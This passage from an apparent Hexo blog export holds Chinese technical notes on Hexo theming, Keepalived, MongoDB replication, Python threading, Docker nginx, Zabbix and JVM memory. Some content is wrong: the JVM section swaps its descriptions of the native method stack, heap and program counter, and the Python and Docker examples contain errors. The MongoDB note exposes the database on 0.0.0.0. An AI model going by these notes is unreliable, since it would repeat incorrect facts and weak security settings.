<h2 id="每行目录超长自动换行"><a href="#每行目录超长自动换行" class="headerlink" title="每行目录超长自动换行"></a>每行目录超长自动换行</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">toc:</span><br><span class="line">  enable: true  </span><br><span class="line">  wrap: true</span><br></pre></td></tr></table></figure>
<h2 id="修改链接"><a href="#修改链接" class="headerlink" title="修改链接"></a>修改链接</h2><p><a href="https://hexo.io/zh-cn/docs/permalinks.html" target="_blank" rel="noopener">Permalinks 修改官方教程</a></p>
<p><a href="https://www.jianshu.com/p/02afabcae502" target="_blank" rel="noopener">搜索插件报错</a></p>
<h2 id="Hexo-Next-添加菜单分类页面"><a href="#Hexo-Next-添加菜单分类页面" class="headerlink" title="Hexo+Next 添加菜单分类页面"></a>Hexo+Next 添加菜单分类页面</h2><p>新建一个页面，命名为resources。<br><code>hexo new page &quot;resources&quot;</code><br>此时会在hexo &gt; source文件夹中会生成一个resources文件夹。</p>
<p>编辑resources文件夹下的md页面<br>将类型设置为resources，主题将自动为这个页面显示所有分类。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">title: 常用工具</span><br><span class="line">date: 2017-12-14 13:05:38</span><br><span class="line">type: &quot;resources&quot;</span><br><span class="line">---</span><br></pre></td></tr></table></figure></p>
<p>注意：如果有启用多说或者Disqus评论，默认页面也会带有评论。需要关闭的话，请添加字段comments并将值设置为false，如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">title: 常用工具</span><br><span class="line">date: 2017-12-14 13:05:38</span><br><span class="line">type: &quot;resources&quot;</span><br><span class="line">comments: false</span><br><span class="line">---</span><br></pre></td></tr></table></figure></p>
<p>在菜单中添加链接<br>编辑主题的_config.yml，在menu中的添加如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">menu:</span><br><span class="line">  resources: /resources || download</span><br><span class="line">||之前的值是目标链接，之后的是分类页面的图标，图标名称来自于FontAwesome icon。若没有配置图标，默认会使用问号图标。  </span><br><span class="line">或者修改下方的</span><br><span class="line">menu_icons:</span><br><span class="line">  enable: true</span><br><span class="line">  #KeyMapsToMenuItemKey: NameOfTheIconFromFontAwesome</span><br><span class="line">  home: home</span><br><span class="line">  about: user</span><br><span class="line">  categories: th</span><br><span class="line">  # schedule: calendar</span><br><span class="line">  tags: tags</span><br><span class="line">  archives: archive</span><br><span class="line">  # sitemap: sitemap</span><br><span class="line">  # commonweal: heartbeat</span><br><span class="line">  share: sitemap</span><br></pre></td></tr></table></figure>
<p>新添加的菜单需要翻译对应的中文<br>打开hexo&gt;theme&gt;next&gt;languages&gt;zh-Hans.yml，在menu下添加：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">menu:</span><br><span class="line">  home: 首页</span><br><span class="line">  archives: 归档</span><br><span class="line">  categories: 分类</span><br><span class="line">  tags: 标签</span><br><span class="line">  about: 关于</span><br><span class="line">  search: 搜索</span><br><span class="line">  schedule: 日程表</span><br><span class="line">  sitemap: 站点地图</span><br><span class="line">  commonweal: 公益404</span><br><span class="line">  resources: 资源</span><br></pre></td></tr></table></figure>
<p>ps：zh-Hans.yml一定要修改，不然菜单显示会有问题，显示 menu.title</p>
<h2 id="升级版本"><a href="#升级版本" class="headerlink" title="升级版本"></a>升级版本</h2><p><a href="https://zhuanlan.zhihu.com/p/163830894" target="_blank" rel="noopener">Hexo 和Next主题升级</a><br><a href="https://blog.csdn.net/weixin_39654352/article/details/112409785" target="_blank" rel="noopener">hexo评论_Hexo系列 | Hexo的基本使用</a><br><a href="https://blog.orduster.top/post/258e012e/" target="_blank" rel="noopener">hexo-theme-next 主题美化</a><br><a href="https://blog.csdn.net/weixin_43828250/article/details/114379300" target="_blank" rel="noopener">Hexo NexT 添加背景图片</a><br><a href="https://blog.csdn.net/Aoman_Hao/article/details/87917671" target="_blank" rel="noopener">Hexo博客Next主题配置加载优化性能提升</a><br><a href="https://tding.top/archives/dfac1e9c.html" target="_blank" rel="noopener">Hexo-NexT 主题样式美化 - 动画设置</a><br><a href="https://blog.csdn.net/baidu_34310405/article/details/102665373" target="_blank" rel="noopener">Hexo Next主题添加访客统计、访问次数统计、文章阅读次数统计</a><br><a href="https://blog.csdn.net/death05/article/details/101446424" target="_blank" rel="noopener">Hexo引流到微信</a><br><a href="https://www.zhyong.cn/posts/20ec/" target="_blank" rel="noopener">hexo-next 添加酷炫打赏二维码</a><br><a href="https://blog.csdn.net/wugenqiang/article/details/88581218" target="_blank" rel="noopener">hexo-next主题添加近期文章版块</a><br><a href="https://www.jianshu.com/p/b9e73c881729" target="_blank" rel="noopener">Hexo 集成 Valine 评论系统</a><br><a href="https://www.jianshu.com/p/5b58ecce6443" target="_blank" rel="noopener">解决hexo引入图床，防盗链破解</a><br><a href="https://blog.csdn.net/weixin_43167980/article/details/113808068" target="_blank" rel="noopener">Valine评论系统添加邮件提醒</a><br><a href="https://github.com/DesertsP/Valine-Admin" target="_blank" rel="noopener">Valine 评论系统的扩展和增强</a><br><a href="https://haomingzhang.com/hexo_4/" target="_blank" rel="noopener">hexo + next8.0开启Valine评论系统及添加留言板功能</a><br><a href="https://haomingzhang.com/hexo_3/" target="_blank" rel="noopener">为hexo next8.0主题添加一个可以切换的黑色/夜间模式</a><br><a href="https://zhuanlan.zhihu.com/p/128033054" target="_blank" rel="noopener">Hexo博客提交百度收录SEO</a></p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux-Keepalived</title>
    <url>/Linux-Keepalived/</url>
    <content><![CDATA[<h2 id="Keepalived的工作原理"><a href="#Keepalived的工作原理" class="headerlink" title="Keepalived的工作原理"></a>Keepalived的工作原理</h2><p>在一个虚拟路由器中，只有作为MASTER的VRRP路由器会一直发送VRRP通告信息,<br>BACKUP不会抢占MASTER，除非它的优先级更高。当MASTER不可用时(BACKUP收不到通告信息)<br>多台BACKUP中优先级最高的这台会被抢占为MASTER。这种抢占是非常快速的(&lt;1s)，以保证服务的连续性<br>由于安全性考虑，VRRP包使用了加密协议进行加密。BACKUP不会发送通告信息，只会接收通告信息</p>
<h2 id="keepalive的工作原理和如何做到健康检查"><a href="#keepalive的工作原理和如何做到健康检查" class="headerlink" title="keepalive的工作原理和如何做到健康检查"></a>keepalive的工作原理和如何做到健康检查</h2><p>keepalived是以VRRP协议为实现基础的，VRRP全称Virtual Router Redundancy Protocol，即虚拟路由冗余协议。</p>
<p>虚拟路由冗余协议，可以认为是实现路由器高可用的协议，即将N台提供相同功能的路由器组成一个路由器组<br>这个组里面有一个master和多个backup，master上面有一个对外提供服务的vip（该路由器所在局域网内<br>其他机器的默认路由为该vip），master会发组播，当backup收不到vrrp包时就认为master宕掉了<br>这时就需要根据VRRP的优先级来选举一个backup当master。这样就可以保证路由器的高可用了</p>
<p>keepalived主要有三个模块，分别是core、check和vrrp。core模块为keepalived的核心，负责主进程的启动、维护及全局配置文件的加载和解析。check负责健康检查，包括常见的各种检查方式，vrrp模块是来实现VRRP协议的</p>
<p>Keepalived健康检查方式配置<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP_GET|SSL_GET</span><br><span class="line">HTTP_GET | SSL_GET</span><br><span class="line">&#123;</span><br><span class="line">url &#123;</span><br><span class="line">path /# HTTP/SSL 检查的url可以是多个</span><br><span class="line">digest  # HTTP/SSL 检查后的摘要信息用工具genhash生成</span><br><span class="line">status_code 200# HTTP/SSL 检查返回的状态码</span><br><span class="line">&#125;</span><br><span class="line">connect_port 80 # 连接端口</span><br><span class="line">bindto</span><br><span class="line">connect_timeout 3 # 连接超时时间</span><br><span class="line">nb_get_retry 3 # 重连次数</span><br><span class="line">delay_before_retry 2 #连接间隔时间</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Keepalived</tag>
      </tags>
  </entry>
  <entry>
    <title>Lua-查缺补漏</title>
    <url>/Lua-%E6%9F%A5%E7%BC%BA%E8%A1%A5%E6%BC%8F/</url>
    <content><![CDATA[<p>Lua 是一种嵌入式开发语言，核心保持了短小精悍，你可以在 Redis、NGINX 中嵌入 Lua，来帮助你更灵活地完成业务逻辑。同时，Lua 也可以调用已有的 C 函数和数据结构，避免重复造轮子。<br><a id="more"></a></p>
]]></content>
      <categories>
        <category>Lua</category>
      </categories>
      <tags>
        <tag>小型组</tag>
        <tag>Lua</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB实战经验</title>
    <url>/MongoDB%E5%AE%9E%E6%88%98%E7%BB%8F%E9%AA%8C/</url>
    <content><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="树莓派上的安装"><a href="#树莓派上的安装" class="headerlink" title="树莓派上的安装"></a>树莓派上的安装</h3><p>仅仅适用于Raspbian这种debian系，CentOS等其他树莓派系统无法启用，网上有很多尝试，都很复杂，徒劳。</p>
<p>Raspbian<br>如果使用的是raspbian，源里面有这个软件的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install mongodb</span><br></pre></td></tr></table></figure>
<p>CentOS等<br>这里说一下Centos版本的Pi的安装：</p>
<p>结果就是：无法成功！<br><a id="more"></a></p>
<h3 id="windows上的安装"><a href="#windows上的安装" class="headerlink" title="windows上的安装"></a>windows上的安装</h3><p>仅列出关键步骤</p>
<p>1、在mongodb目录下建立data文件夹，然后在data文件夹建立db文件夹，然后在控制台中使用上面的指令启动mongodb：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mongod --dbpath D:\NoSQL\mongodb-win32-x86_64-2.4.3\data\db</span><br><span class="line"></span><br><span class="line">注意：控制台输出有错误&quot;ERROR: dbpath (\data\db\) does not exist.&quot;  \data\db\文件路径不存在。用这条代码运行。</span><br></pre></td></tr></table></figure></p>
<p>2、在mongodb目录下建立data文件夹，然后在data文件夹建立log文件夹<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mongod --dbpath &quot;D:\MongoDB\data\db&quot; --logpath &quot;D:\MongoDB\data\log\MongoDB.log&quot; --install --serviceName &quot;MongoDB&quot;</span><br></pre></td></tr></table></figure></p>
<p>3、作为服务进行安装</p>
<p>MongoDB在Windows中还可以作为服务进行安装。这样可以通过控制面板-管理工具-服务来启动和关闭mongo了。</p>
<p>使用完整的路径来运行，忽略所有空格并使用–install选项，就可以安装了（–logpath必须设置 ）。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mongod -dbpath &quot;D:\NoSQL\mongodb-win32-x86_64-2.4.3\data\db&quot;  --logpath &quot;D:\NoSQL\mongodb-win32-x86_64-2.4.3\data\log\mongodb.log&quot;  --install --serviceName &quot;MongoDB&quot;</span><br></pre></td></tr></table></figure></p>
<p>4、运行/停止<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net start MongoDB</span><br><span class="line">net stop MongoDB</span><br></pre></td></tr></table></figure></p>
<h2 id="MongoDB在linux上的运行"><a href="#MongoDB在linux上的运行" class="headerlink" title="MongoDB在linux上的运行"></a>MongoDB在linux上的运行</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 启动MongoDB</span><br><span class="line">sudo service mongod start</span><br><span class="line">2. 验证MongoDB是否启动成功（在/var/log/mongodb/mongod.log文件中看到下面这一行就表示启动成功）</span><br><span class="line">[initandlisten] waiting for connections on port 27017</span><br><span class="line">3. 停止MongoDB进程</span><br><span class="line">sudo service mongod stop</span><br><span class="line">4. 重启MongoDB</span><br><span class="line">sudo service mongod restart</span><br><span class="line">5. 查看MongoDB运行状态</span><br><span class="line">sudo service mongod status</span><br></pre></td></tr></table></figure>
<h2 id="mongodb远程连接配置"><a href="#mongodb远程连接配置" class="headerlink" title="mongodb远程连接配置"></a>mongodb远程连接配置</h2><p>修改配置文件mongodb.conf</p>
<p>命令：<code>vim /etc/mongodb.conf</code></p>
<p>把 bind_ip=127.0.0.1 这一行注释掉或者是修改成 bind_ip=0.0.0.0</p>
<h3 id="连接到自定义的用户"><a href="#连接到自定义的用户" class="headerlink" title="连接到自定义的用户"></a>连接到自定义的用户</h3><p>1.增加<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; use admin</span><br><span class="line">switched to db admin</span><br><span class="line">&gt; db.addUser(&apos;username&apos;,&apos;password&apos;)</span><br></pre></td></tr></table></figure></p>
<p>2.远程连接</p>
<p>命令： <code>mongo 134.567.345.23:27017/admin -uusername -p</code></p>
<p>输入password即可</p>
<h2 id="MongoDB-的主从复制与双主复制"><a href="#MongoDB-的主从复制与双主复制" class="headerlink" title="MongoDB 的主从复制与双主复制"></a>MongoDB 的主从复制与双主复制</h2><h3 id="主从"><a href="#主从" class="headerlink" title="主从"></a>主从</h3><h3 id="双主"><a href="#双主" class="headerlink" title="双主"></a>双主</h3><p>MM和MS方式操作基本相同，只是两端都是MASTER。还是借用上一篇文章的我文件目录。</p>
<p>启动MASTER1<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/usr/local/bin/mongod --master --slave -dbpath=/data/db/master -port=11536 --source 127.0.0.1:11537</span><br></pre></td></tr></table></figure></p>
<p>启动MASTER2<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/usr/local/bin/mongod --master --slave -dbpath=/data/db/master -port=11537 --source 127.0.0.1:11536</span><br></pre></td></tr></table></figure></p>
<p>这里比较有意思，启动参数里把–master 和 –slave 指定，就可以存在双层身份了。</p>
<p>查看MASTER2打印出来的信息，如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mon Jul 25 22:28:26 [conn1] getmore local.oplog.$main cid:7469048783387752013 getMore: &#123; ts: &#123; $gte: new Date(5633526834852265985) &#125; &#125; bytes:20 nreturned:0 3919ms</span><br><span class="line">Mon Jul 25 22:28:27 [replslave] repl: applied 1 operations</span><br><span class="line">Mon Jul 25 22:28:27 [replslave] repl: end sync_pullOpLog syncedTo: Jul 25 22:28:20 4e2e5074:1</span><br><span class="line">Mon Jul 25 22:28:27 [replslave] repl: from host:127.0.0.1:11537</span><br></pre></td></tr></table></figure></p>
<p>这里可以看到from host:127.0.0.1:11537<br>在MASTER1上可以看到类似的信息，端口为11536</p>
<p>在M1上创建库，表，M2上可以查到。M2上删除记录，M1上可以看到。双向同步成功。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mon Jul 25 22:28:26 [conn1] getmore local.oplog.$main cid:7469048783387752013 getMore: &#123; ts: &#123; $gte: new Date(5633526834852265985) &#125; &#125; bytes:20 nreturned:0 3919ms</span><br></pre></td></tr></table></figure></p>
<p>这样的信息是正常的，不影响复制。</p>
]]></content>
      <categories>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>Python多线程</title>
    <url>/Python%E5%A4%9A%E7%BA%BF%E7%A8%8B/</url>
    <content><![CDATA[<p>1、默认启动主线程</p>
<p>一般的，程序默认执行只在一个线程，这个线程称为主线程，例子演示如下：</p>
<p>导入线程相关的模块 threading:</p>
<p>import threading<br>threading的类方法 current_thread()返回当前线程：</p>
<p>t = threading.current_thread()<br>print(t) # &lt;_MainThread(MainThread, started 139908235814720)&gt;<br>所以，验证了程序默认是在MainThead中执行。</p>
<p>t.getName()获得这个线程的名字，其他常用方法，getName()获得线程id,isAlive()判断线程是否存活等。<br><a id="more"></a><br>print(t.getName()) # MainThread<br>print(t.ident) # 139908235814720<br>print(t.isAlive()) # True<br>以上这些仅是介绍多线程的背景知识，因为到目前为止，我们有且仅有一个”干活”的主线程</p>
<p>2、创建线程</p>
<p>创建一个线程：</p>
<p>my_thread = threading.Thread()<br>创建一个名称为my_thread的线程：</p>
<p>my_thread = threading.Thread(name=’my_thread’)<br>创建线程的目的是告诉它帮助我们做些什么，做些什么通过参数target传入，参数类型为callable，函数就是可调用的：</p>
<p>def print_i(i):<br>    print(‘打印i:%d’%(i,))<br>my_thread = threading.Thread(target=print_i,args=(1,))<br>my_thread线程已经全副武装，但是我们得按下发射按钮，启动start()，它才开始真正起飞。</p>
<p>my_thread().start()<br>打印结果如下，其中args指定函数print_i需要的参数i，类型为元祖。</p>
<p>打印i:1<br>至此，多线程相关的核心知识点，已经总结完毕。但是，仅仅知道这些，还不够！光纸上谈兵，当然远远不够。</p>
<p>接下来几天，咱们一起聊聊应用多线程编程，最本质的一些东西。我会通过小例子通俗易懂的解释，欢迎到时关注。</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>多线程</tag>
      </tags>
  </entry>
  <entry>
    <title>docker-nginx安装与使用</title>
    <url>/docker-nginx%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="镜像加速"><a href="#镜像加速" class="headerlink" title="镜像加速"></a>镜像加速</h2><p>推荐使用阿里云</p>
<p><a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors" target="_blank" rel="noopener">https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors</a></p>
<p>由此链接申请加速镜像源地址</p>
<p>然后根据官方配置说明，操作配置下就ok<br><a id="more"></a><br>eg：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ubuntu:</span><br><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&apos;EOF&apos;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://********.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure></p>
<h2 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h2><p>配置好加速镜像源地址之后</p>
<p><code>docker pull nginx</code></p>
<p>拉取 nginx 的 docker 镜像，然后 <code>docker inages</code> 可已查看到下载下来的 nginx 镜像。</p>
<h2 id="启动镜像（新手启动下练练手）"><a href="#启动镜像（新手启动下练练手）" class="headerlink" title="启动镜像（新手启动下练练手）"></a>启动镜像（新手启动下练练手）</h2><p><code>docker run --name nginx-test -p 8080:80 -d nginx</code><br>–name : 自定义；<br>-p : 80 是 docker 内端口，8080 是docker映射出去的端口；<br>-d ：是 nginx 的镜像名；</p>
<p>玩一玩就可以卸载了<br>docker stop nginx-test<br>docker rm nginx-test</p>
<p>因为镜像是空的，里面没你的文件或者配置啊。</p>
<h2 id="创建名为-nginx-容器的挂载卷"><a href="#创建名为-nginx-容器的挂载卷" class="headerlink" title="创建名为 nginx  容器的挂载卷"></a>创建名为 nginx  容器的挂载卷</h2><p>什么是挂载卷，就是 docker 容器物理机提供的一个文件夹，用户可见，用户可以修改，放置静态资源。这样也有个好处，就是容器删除后，挂载卷的东西还在，可以为新容器服务。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker volume create nginx</span><br><span class="line">docker volume ls</span><br><span class="line">docker volume inspect nginx </span><br><span class="line"></span><br><span class="line">  root@ubuntu-X555LJ:/home/ubuntu/blog# docker volume ls</span><br><span class="line">DRIVER              VOLUME NAME</span><br><span class="line">local               nginx</span><br><span class="line">root@ubuntu-X555LJ:/home/ubuntu/blog#  docker volume inspect nginx </span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;CreatedAt&quot;: &quot;2020-03-30T00:20:35+08:00&quot;,</span><br><span class="line">        &quot;Driver&quot;: &quot;local&quot;,</span><br><span class="line">        &quot;Labels&quot;: &#123;&#125;,</span><br><span class="line">        &quot;Mountpoint&quot;: &quot;/var/lib/docker/volumes/nginx/_data&quot;,</span><br><span class="line">        &quot;Name&quot;: &quot;nginx&quot;,</span><br><span class="line">        &quot;Options&quot;: &#123;&#125;,</span><br><span class="line">        &quot;Scope&quot;: &quot;local&quot;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="启动新建的容器"><a href="#启动新建的容器" class="headerlink" title="启动新建的容器"></a>启动新建的容器</h2><p><code>docker run -d -v nginx:/etc/nginx -v /home/ubuntu/blog/public:/usr/share/nginx/html1 -p 3002:3002 -p 80:80 --name nginx nginx</code></p>
<p>“-v  nginx:/etc/nginx “这个参数, 这个的意思是将数据卷nginx挂载到容器的/etc/nginx目录<br>“ -v /home/ubuntu/blog/public:/usr/share/nginx/html1”   “/usr/share/nginx/html1” 是容器的配置对应端口所指向的本地的静态资源目录，”/home/ubuntu/blog/public” 是物理机中的静态资源目录。<br>通俗说就是： 将本地的   “/home/ubuntu/blog/public”   目录挂载到容器的  “/usr/share/nginx/html1”</p>
<h2 id="如何修改-nginx-的配置文件"><a href="#如何修改-nginx-的配置文件" class="headerlink" title="如何修改 nginx 的配置文件"></a>如何修改 nginx 的配置文件</h2><pre><code>cd /var/lib/docker/volumes/nginx/_data/conf.d
vim default.conf
</code></pre><p>就在物理机的挂载点下面。<br>修改之后要和启动项的参数配得上。(改这个需要懂nginx基础)</p>
<h2 id="然后访问对应端口。"><a href="#然后访问对应端口。" class="headerlink" title="然后访问对应端口。"></a>然后访问对应端口。</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1、下载镜像<br>2、创建挂载卷<br>3、记下对应配置项所挂载的本地路径<br>4、确定容器内资源路径与本地路径的对应关系<br>5、启动，参数一一对应<br>6、根据静态资源的自定义挂载点修改对应的配置文件<br>7、重启<br>8、访问</p>
<p><a href="https://my.oschina.net/u/2518341/blog/2990166" target="_blank" rel="noopener">参考博客</a></p>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Zabbix-升级打怪之路</title>
    <url>/Zabbix-%E5%8D%87%E7%BA%A7%E6%89%93%E6%80%AA%E4%B9%8B%E8%B7%AF/</url>
    <content><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Zabbix 是一个开源的监控系统，可以帮助我们实时收集服务器或者网页的信息，并建立触发器，达到报警的效果。它大致可以分为如下两个功能：</p>
<p>配置物理/虚拟主机，监控该主机的硬件、系统、服务等信息（Zabbix-agent）<br>配置 Web 监控，实时获取网页信息（Zabbix-server）</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="普通安装"><a href="#普通安装" class="headerlink" title="普通安装"></a>普通安装</h3><p><a href="http://www.zsythink.net/archives/500" target="_blank" rel="noopener">参考教程</a><br><a id="more"></a></p>
<h3 id="docker-安装-zabbix"><a href="#docker-安装-zabbix" class="headerlink" title="docker 安装 zabbix"></a>docker 安装 zabbix</h3><p>方法一：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run --name zabbix-appliance -t \</span><br><span class="line">  -p 10051:10051 \</span><br><span class="line">  -p 80:80 \</span><br><span class="line">  -d zabbix/zabbix-appliance:latest</span><br></pre></td></tr></table></figure></p>
<p>方法二：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker run --name zabbix-appliance -p 8081:80 -d </span><br><span class="line"></span><br><span class="line"> zabbix-appliance-test 容器名称。</span><br><span class="line">-d 设置容器在在后台一直运行。</span><br><span class="line">-p 端口进行映射，将本地 8081 端口映射到容器内部的 80 端口。</span><br></pre></td></tr></table></figure></p>
<h4 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h4><p>zabbix-web-nginx-mysql的端口是8081，服务器ip:8081应该能到server登陆界面，然而报错“the server does not match zabbix database”<br>版本问题：<br>在/usr/share/doc/zabbix-server-mysql文件夹下找到了类似作用的文件create.sql.gz，在使用指令<code>zcat /usr/share/doc/zabbix-server-mysql/create.sql.gz | mysql -uzabbix -pzabbix zabbix</code>即可导入数据库。这里又碰到一个小问题，因为zabbix-server-mysql和mysql均为容器，直接操作会报错ERROR 2002 (HY000): Can’t connect to local MySQL server through socket ‘/run/mysqld/mysqld.sock’ (2 “No such file or directory”)。这个问题我选择跳过去，方法就是先从容器zabbix-server-mysql把create.sql.gz导出到主机，再从主机导入到mysql容器，再执行zcat /usr/share/doc/zabbix-server-mysql/create.sql.gz | mysql -uzabbix -pzabbix zabbix，然后重启相关容器就可以了。</p>
]]></content>
      <categories>
        <category>运维</category>
      </categories>
      <tags>
        <tag>运维</tag>
        <tag>Linux</tag>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title>hugo-blog搭建</title>
    <url>/hugo-blog%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>直接二进制安装简单</p>
<p>UGO安装包下载地址:<a href="https://github.com/gohugoio/hugo/releases" target="_blank" rel="noopener">https://github.com/gohugoio/hugo/releases</a> 进入网站,选择自己系统对应的安装包.</p>
<p>然后选择配置环境变量（指向hugo的目录）</p>
<p>然后新建 hugo-blog 的文件夹</p>
<p>然后在文件夹下用命令生成 hugo 的资源文件文件<br><a id="more"></a><br>然后选择喜欢的主题移动到 资源文件 的主题目录下</p>
<p>然后启动</p>
<p>1.创建站点hugo new site augest<br>2.下载博客主题:git clone <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:shankar/hugo-grapes.git  也可以手动 copy<br>3.新建博客文章:hugo new first.md<br>4.启动hugo:hugo server –theme=hugo-grapes –buildDrafts<br>5.启动本地调试：hugo server –theme=hyde –buildDrafts –watch</p>
]]></content>
      <categories>
        <category>hugo</category>
      </categories>
      <tags>
        <tag>hugo</tag>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title>java-jvm</title>
    <url>/java-jvm/</url>
    <content><![CDATA[<h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><h1 id="线程-进程-协程"><a href="#线程-进程-协程" class="headerlink" title="线程 进程 协程"></a>线程 进程 协程</h1><h1 id="JVM"><a href="#JVM" class="headerlink" title="JVM"></a>JVM</h1><h2 id="JVM-内存分哪几个区，每个区的作用是什么"><a href="#JVM-内存分哪几个区，每个区的作用是什么" class="headerlink" title="JVM 内存分哪几个区，每个区的作用是什么"></a>JVM 内存分哪几个区，每个区的作用是什么</h2><p>1、方法区：<br>四点<br>a.    有时候也成为永久代，在该区内很少发生垃圾回收，但是并不代表不发生 GC，在这里进行的 GC 主要是对方法区里的常量池和对类型的卸载<br>b.    方法区主要用来存储已被虚拟机加载的类的信息、常量、静态变量和即时编译器编译后  的代码等数据。<br>c.    该区域是被线程共享的。<br>d.    方法区里有一个运行时常量池，用于存放静态编译产生的字面量和符号引用。该常量池   具有动态性，也就是说常量并不一定是编译时确定，运行时生成的常量也会存在这个常  量池中。<br><a id="more"></a><br>2、虚拟机栈<br>五点：<br>a.    虚拟机栈也就是我们平常所称的栈内存,它为 java 方法服务，每个方法在执行的时候都会创建一个栈帧，用于存储局部变量表、操作数栈、动态链接和方法出口等信息。</p>
<p>b.    虚拟机栈是线程私有的，它的生命周期与线程相同。<br>c.    局部变量表里存储的是基本数据类型、returnAddress 类型（指向一条字节码指令的地址） 和对象引用，这个对象引用有可能是指向对象起始地址的一个指针，也有可能是代表对象的句柄或者与对象相关联的位置。局部变量所需的内存空间在编译器间确定<br>d.    操作数栈的作用主要用来存储运算结果以及运算的操作数，它不同于局部变量表通过索  引来访问，而是压栈和出栈的方式<br>e.    每个栈帧都包含一个指向运行时常量池中该栈帧所属方法的引用，持有这个引用是为了  支持方法调用过程中的动态连接.动态链接就是将常量池中的符号引用在运行期转化为直接引用。</p>
<p>3、本地方法栈<br>java 堆是所有线程所共享的一块内存，在虚拟机启动时创建，几乎所有的对象实例都在这里创建，因此该区域经常发生垃圾回收操作。</p>
<p>4、堆<br>内存空间小，字节码解释器工作时通过改变这个计数值可以选取下一条需要执行的字节码指   令，分支、循环、跳转、异常处理和线程恢复等功能都需要依赖这个计数器完成。该内存区   域是唯一一个 java 虚拟机规范没有规定任何 OOM 情况的区域。</p>
<p><img data-src="http://tuchuang.xchcloud.cn/20210810020914.png" alt="测试"></p>
<h2 id="什么是垃圾？"><a href="#什么是垃圾？" class="headerlink" title="什么是垃圾？"></a>什么是垃圾？</h2><h2 id="垃圾回收的是那些区域的内存"><a href="#垃圾回收的是那些区域的内存" class="headerlink" title="垃圾回收的是那些区域的内存"></a>垃圾回收的是那些区域的内存</h2><h2 id="怎么定位垃圾"><a href="#怎么定位垃圾" class="headerlink" title="怎么定位垃圾"></a>怎么定位垃圾</h2><p>###<br><img data-src="http://tuchuang.xchcloud.cn/picGo/20210810021427.png" alt></p>
<h1 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h1><p>spring jpa 行级锁的实现</p>
<p><a href="https://blog.csdn.net/fengyuxue11011/article/details/47039765" target="_blank" rel="noopener">spring jpa 行级锁的实现</a><br><a href="http://blog.sina.com.cn/s/blog_88d2d8f501011sgl.html" target="_blank" rel="noopener">MySQL中select * for update锁表的问题</a><br><a href="https://www.iteye.com/blog/suene-1756295" target="_blank" rel="noopener">Spring Data JPA,基础学习笔记.</a></p>
